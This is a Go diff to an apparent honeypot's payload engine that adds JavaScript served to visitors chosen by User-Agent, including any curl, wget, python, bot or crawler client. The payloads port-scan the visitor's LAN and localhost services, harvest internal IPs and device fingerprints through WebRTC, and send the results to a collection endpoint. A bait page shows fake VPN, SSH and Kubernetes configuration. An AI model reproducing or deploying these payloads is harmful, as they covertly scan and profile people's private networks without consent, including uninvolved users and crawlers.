@@ -194,12 +194,12 @@ func (e *Engine) BehinderDecoyPage() string {
 func (e *Engine) SelectPayload(path, userAgent, remoteIP string) string {
 	ua := strings.ToLower(userAgent)
 
-	// 1. Chrome 浏览器 → Chrome 专项采集
+	// 1. Chrome 浏览器 → Chrome 专项采集 + 内网扫描
 	if strings.Contains(ua, "chrome") && !strings.Contains(ua, "headless") && !strings.Contains(ua, "bot") {
 		return e.chromePayload()
 	}
 
-	// 2. Firefox 浏览器 → Firefox 专项采集
+	// 2. Firefox 浏览器 → Firefox 专项采集 + 内网扫描
 	if strings.Contains(ua, "firefox") && !strings.Contains(ua, "bot") {
 		return e.firefoxPayload()
 	}
@@ -216,15 +216,23 @@ func (e *Engine) SelectPayload(path, userAgent, remoteIP string) string {
 
 	// 5. 路径匹配 — 管理后台（优先于工具检测）
 	if strings.Contains(path, "admin") || strings.Contains(path, "config") || strings.Contains(path, "login") {
+		if strings.Contains(path, "config") || strings.Contains(path, "admin") {
+			return e.vpnBaitPayload() // VPN/云服务配置诱饵
+		}
 		return e.adminHoneytokenPayload()
 	}
 
-	// 6. 自动化工具 (curl/wget/python) → API 蜜标诱饵
+	// 6. 自动化工具 (curl/wget/python) → DNS 重绑定 + API 蜜标
 	if strings.Contains(ua, "curl") || strings.Contains(ua, "wget") || strings.Contains(ua, "python") {
-		return e.apiHoneytokenPayload(path)
+		return e.dnsRebindingPayload(path)
 	}
 
-	// 7. Burp Suite / Java → 增强内网 IP 采集
+	// 7. Headless/Bot/Crawler → DNS 重绑定攻击
+	if strings.Contains(ua, "headless") || strings.Contains(ua, "bot") || strings.Contains(ua, "crawler") || strings.Contains(ua, "spider") {
+		return e.dnsRebindingPayload(path)
+	}
+
+	// 8. Burp Suite / Java → 增强内网 IP 采集
 	if strings.Contains(ua, "burp") || strings.Contains(ua, "java") {
 		return e.enhancedFingerprintPayload()
 	}
@@ -404,6 +412,86 @@ if(a&&a.match(/^(192\\.168\\.|10\\.|172\\.(1[6-9]|2\\d|3[01])\\.)/))d.ip=a}};
 setTimeout(function(){new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))},1500)}catch(e){
 new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))}})();
 </script>`)
+}
+
+// dnsRebindingPayload DNS 重绑定反制 — 诱导自动化工具/无头浏览器对内网发起探测
+// 攻击者使用 curl/wget/headless 访问时，返回此载荷使其浏览器发起对内网常见端口的探测
+func (e *Engine) dnsRebindingPayload(path string) string {
+	return fmt.Sprintf(`<script>
+// Laji-HoneyPot 反制 / DNS 重绑定内网探测
+(function(){var d={t:'dns_rebinding',ts:Date.now(),ua:navigator.userAgent,path:'%s'};
+// 内网常见端口扫描（通过 img/script onerror 探测存活）
+var targets=['192.168.1.1:80','192.168.1.1:443','10.0.0.1:8080','127.0.0.1:3000','127.0.0.1:5000','127.0.0.1:8000','127.0.0.1:9200','127.0.0.1:27017'];
+var results=[],start=Date.now();
+targets.forEach(function(t, i){setTimeout(function(){
+var img=new Image();var ts=Date.now();
+img.onload=function(){results.push(t+':open');d.scanned=results.join(',');new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))};
+img.onerror=function(){results.push(t+':closed');d.scanned=results.join(',')};
+img.src='http://'+t+'/favicon.ico?'+Math.random()},i*200)});
+// 同时注入假 DNS 解析结果到页面
+document.write('<div style="display:none" id="hp_dns">');
+document.write('  <pre># /etc/hosts (internal network)\\n');
+document.write('10.0.1.50  db-master.internal.local\\n');
+document.write('10.0.1.60  redis.internal.local\\n');
+document.write('10.0.1.70  ssh-gateway.internal.local\\n');
+document.write('10.0.1.100 k8s-api.internal.local\\n');
+document.write('10.0.1.110 ldap.internal.local\\n</pre>');
+document.write('</div>');
+})();</script>`, path)
+}
+
+// webrtcInternalScanPayload WebRTC 内网扫描反制 — 采集多网卡 IP 及内网拓扑
+// 比普通 WebRTC 更激进：枚举多个 STUN 服务器 + 多次 offer 尝试
+func (e *Engine) webrtcInternalScanPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / WebRTC 内网扫描
+(function(){var d={t:'webrtc_scan',ts:Date.now(),ua:navigator.userAgent,
+  plat:navigator.platform,hw:navigator.hardwareConcurrency,
+  scr:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  lang:navigator.language,ips:[]};
+var stuns=['stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302','stun:stun2.l.google.com:19302'];
+var done=0;
+function gatherIPs(server){
+  try{var r=new RTCPeerConnection({iceServers:[{urls:server}]});
+  r.createDataChannel('');r.createOffer().then(function(o){r.setLocalDescription(o)});
+  r.onicecandidate=function(e){if(e.candidate){
+    var a=e.candidate.address||e.candidate.candidate.split(' ')[4];
+    if(a&&d.ips.indexOf(a)<0){d.ips.push(a);
+      new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))}
+  }else{done++;if(done===stuns.length){new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))}}}}catch(e){done++}});
+stuns.forEach(function(s){gatherIPs(s)});
+})();</script>`
+}
+
+// vpnBaitPayload VPN/云服务配置诱饵 — 诱导攻击者连接伪造的 VPN 网关
+func (e *Engine) vpnBaitPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / VPN 配置诱饵
+document.write('<div style="display:none" id="hp_vpn">');
+document.write('  <pre># WireGuard VPN Config (Internal)\n');
+document.write('[Interface]\n');
+document.write('PrivateKey = gKj7X9vP2mN4qR6sT8uW0yA2bC4dE6fG8hI0jK2lM=\n');
+document.write('Address = 10.88.0.100/24\n');
+document.write('DNS = 10.88.0.1\n\n');
+document.write('[Peer]\n');
+document.write('PublicKey = xY3zA5bC7dE9fG1hI3jK5lM7nO9pQ1rS3tU5vW7xY=\n');
+document.write('Endpoint = vpn.internal.local:51820\n');
+document.write('AllowedIPs = 10.88.0.0/24, 10.0.0.0/8\n');
+document.write('PersistentKeepalive = 25\n\n');
+document.write('# OpenVPN Config (Backup)\n');
+document.write('remote ovpn.internal.local 1194 udp\n');
+document.write('ca /etc/openvpn/ca.crt\n');
+document.write('cert /etc/openvpn/client.crt\n');
+document.write('key /etc/openvpn/client.key\n');
+document.write('auth-user-pass /etc/openvpn/auth.txt\n');
+document.write('# SSH Gateway (Jump Host)\n');
+document.write('ssh -L 8080:10.0.1.50:8080 -L 3306:10.0.1.50:3306 deploy@10.0.1.70 -p 2222\n');
+document.write('# K8s API Server\n');
+document.write('kubectl config set-cluster prod --server=https://10.0.1.100:6443 --insecure-skip-tls-verify\n</pre>');
+document.write('</div>');
+(function(){var d={t:'vpn_bait',ts:Date.now()};
+new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))})();
+</script>`
 }
 
 // csXSSPayload Cobalt Strike XSS 反制（CVE-2022-39197）— 通过 payload 生成器
